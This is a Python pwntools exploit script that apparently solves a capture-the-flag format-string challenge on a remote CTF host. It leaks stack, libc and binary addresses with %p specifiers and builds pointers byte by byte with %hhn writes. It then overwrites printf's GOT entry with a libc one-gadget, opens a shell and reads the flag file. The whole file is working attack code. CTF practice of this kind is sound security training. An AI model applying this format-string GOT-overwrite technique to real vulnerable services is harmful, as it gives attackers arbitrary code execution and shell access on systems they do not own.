#! /usr/bin/env python

from pwn import *


def takeFirst(e):
    return e[0]

io = remote("csie.ctf.tw", 10130)
#io = remote("localhost", 8888)

raw_input('@')

fmt_leak_stack = '%6$p'
fmt_leak_libc = '%11$p'
fmt_leak_text = '%7$p'
MARK = 'AAAA'

io.sendafter(':)',fmt_leak_stack + MARK + fmt_leak_libc + MARK + fmt_leak_text + MARK + MARK)
leak_stack = int(io.recvuntil(MARK, True), 16)
leak_libc = int(io.recvuntil(MARK, True), 16)
leak_text = int(io.recvuntil(MARK, True), 16)

# libc_index is the index of __libc_start_main in libc
libc_index = 0x21ab0 + 0xe7
libc_base = leak_libc - libc_index

print "libc base: "+hex(libc_base)
print "text base: "+hex(leak_text)

# use one gadget to exploit
one_gadget = libc_base + 0x4f440

printf_got = leak_text + 0x2004da

p2cursor = 6
cursor = 8


# use p2cursor to control cursor to write address to printf@got 
# write $rsp+0x20, point to printf@got + 1
temp_printf_got = printf_got
cursor_low = (leak_stack + 0x10)%0x100

for i in range(0,3):
    printf_got_byte = temp_printf_got%0x100
    temp_printf_got /= 0x100
    if i == 0:
        printf_got_byte += 1        # point to printf@got + 1

    fmt_mv_cursor = '%' + str(cursor_low + i) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor)
    fmt_printf_got = '%' + str(printf_got_byte) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_printf_got)

# write at $rsp+0x18, point to printf@got
temp_printf_got = printf_got
cursor_low = cursor_low - 0x8

for i in range(0,3):
    printf_got_byte = temp_printf_got%0x100
    temp_printf_got /= 0x100

    fmt_mv_cursor = '%' + str(cursor_low + i) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor)
    fmt_printf_got = '%' + str(printf_got_byte) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_printf_got)

# write at $rsp+0x28, point to printf@got+2
# have to write 6 bytes this time.
temp_printf_got = printf_got
cursor_low = cursor_low + 0x10

for i in range(0,6):
    printf_got_byte = temp_printf_got%0x100
    temp_printf_got /= 0x100
    if i == 0:
        printf_got_byte += 2        # point to printf@got + 2

    fmt_mv_cursor = '%' + str(cursor_low + i) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor)
    fmt_printf_got = '%' + str(printf_got_byte) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_printf_got)

# hijecting the got

onegadget_low = one_gadget%0x100                # 1 byte
onegadget_mid = (one_gadget/0x100)%0x100        # 1 byte
onegadget_high = (one_gadget/0x10000)%0x100     # 1 byte

fmt_list = [ (onegadget_low, 9), (onegadget_mid, 10), (onegadget_high, 11) ]    # (value_want_to_write, position_to_write)

fmt_list.sort(key=takeFirst)


#raw_input('ready for the final fmt!')
fmt_overwrite_got = ''
pre = 0
for i in range(0,3):
    fmt_overwrite_got += '%' + str(fmt_list[i][0] - pre) + 'c' + '%' + str(fmt_list[i][1]) +'$hhn'
    pre = fmt_list[i][0]
fmt_overwrite_got += MARK
io.sendafter( MARK, fmt_overwrite_got)

sleep(1)
io.sendline('sh')
sleep(1)
io.sendline('cat /home/`whoami`/flag')

io.interactive()
